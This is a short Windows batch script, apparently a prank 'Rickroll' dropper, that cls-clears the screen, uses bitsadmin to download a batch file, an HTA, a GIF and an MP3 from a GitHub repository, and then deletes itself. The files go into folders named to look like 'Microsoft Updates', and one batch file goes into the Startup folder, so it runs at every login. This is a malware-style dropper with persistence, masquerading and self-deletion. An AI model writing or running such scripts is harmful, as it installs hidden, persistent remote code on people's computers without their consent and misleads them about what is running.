@echo off

cls

bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/bgwork.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrklbg.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/rick.hta" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrkl.hta"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/msrkl.gif" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.gif"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection-v1/main/Projects/Rickroll/msrkl.mp3" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.mp3"

del startup.bat
